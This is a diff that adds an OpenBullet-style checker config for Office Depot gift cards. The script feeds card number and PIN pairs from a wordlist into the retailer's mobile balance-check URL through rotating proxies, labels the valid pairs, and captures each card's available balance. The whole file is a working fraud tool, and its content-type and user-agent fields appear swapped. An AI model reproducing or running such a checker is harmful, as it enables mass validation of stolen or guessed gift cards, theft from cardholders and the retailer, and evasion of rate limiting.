@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Office Depot GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-13T11:19:14.8892183+00:00",
+  "AdditionalInfo": "",
+  "Author": "gee ",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "CardPin",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.officedepot.com/mobile/checkGiftCardBalance.do?storedValueCardNumber=<USER>&storedValueCardPin=<PASS>" AutoRedirect=TRUE 
+  CONTENT "{}" 
+  CONTENTTYPE "Dalvik/1.6.0 (Linux; U; Android 4.4.4; SM-N950FD Build/KTU84P)" 
+  HEADER "Accept: application/vnd.3210c3cdm9+json; version=2.0" 
+  HEADER "User-Agent: application/json" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+PARSE "<SOURCE>" JSON "available" Recursive=FALSE -> CAP "Amount" "" "" 
